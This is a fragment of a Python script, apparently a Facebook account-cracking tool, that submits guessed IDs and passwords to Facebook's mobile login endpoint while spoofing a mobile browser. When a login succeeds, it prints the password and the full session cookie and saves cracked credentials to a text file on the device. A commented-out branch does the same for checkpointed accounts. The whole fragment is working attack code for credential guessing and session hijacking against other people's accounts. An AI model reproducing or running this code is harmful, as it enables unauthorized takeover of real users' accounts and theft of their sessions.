"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"Infinix PR652B"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"11.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[TANJID-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                print("\x1b[38;5;208m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            #elif 'checkpoint' in log_cookies:
                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #cid = coki[82:97]
                #print(f"\x1b[38;5;196m[𝐀.𝐀𝐚𝐥𝐚𝐱 𝐉𝐚𝐡𝐢𝐝-CP] {cid} | {ps}")
                #open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                #cps.append(uid)
                #break
            else:
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[𝐀.𝐀𝐚𝐥𝐚𝐱 𝐉𝐚𝐡𝐢𝐝] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()
